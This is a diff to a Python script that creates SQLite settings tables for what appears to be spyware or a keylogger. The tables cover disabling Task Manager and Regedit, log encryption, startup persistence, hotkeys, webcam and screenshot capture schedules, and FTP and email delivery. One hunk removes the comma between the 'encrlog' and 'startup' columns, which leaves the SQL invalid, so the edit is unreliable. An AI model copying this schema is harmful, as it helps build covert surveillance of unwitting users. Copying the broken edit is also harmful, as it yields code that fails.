@@ -18,7 +18,7 @@ try:
     #General table
     c.execute('''CREATE TABLE IF NOT EXISTS General
               (id INTEGER NOT NULL UNIQUE , disTaskManager INTEGER NOT NULL DEFAULT 0,
-            disRegedit INTEGER NOT NULL DEFAULT 0,encrlog INTEGER NOT NULL DEFAULT 0,
+            disRegedit INTEGER NOT NULL DEFAULT 0,encrlog INTEGER NOT NULL DEFAULT 0
             startup INTEGER NOT NULL DEFAULT 0, hotkey TEXT
              , FOREIGN KEY (id) REFERENCES Users(id))''')
     #FTP table
@@ -39,7 +39,7 @@ try:
     c.execute('''CREATE TABLE IF NOT EXISTS Webcam
              (id INTEGER NOT NULL UNIQUE ,
              enable INTEGER NOT NULL DEFAULT 0,
-             hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
+             hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0
              , FOREIGN KEY (id) REFERENCES Users(id))''')
     
     #Target table
@@ -57,7 +57,7 @@ try:
              (id INTEGER NOT NULL UNIQUE, enable INTEGER NOT NULL DEFAULT 0, timeNuser INTEGER NOT NULL DEFAULT 0,
              doubleScr INTEGER NOT NULL DEFAULT 1, enDel INTEGER NOT NULL DEFAULT 0,
              daysDel INTEGER NOT NULL DEFAULT 3,
-            hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0,
+            hours INTEGER DEFAULT 1, minutes INTEGER DEFAULT 0
              , quality INTEGER DEFAULT 50
              , FOREIGN KEY (id) REFERENCES Users(id))''')    
     #Email table
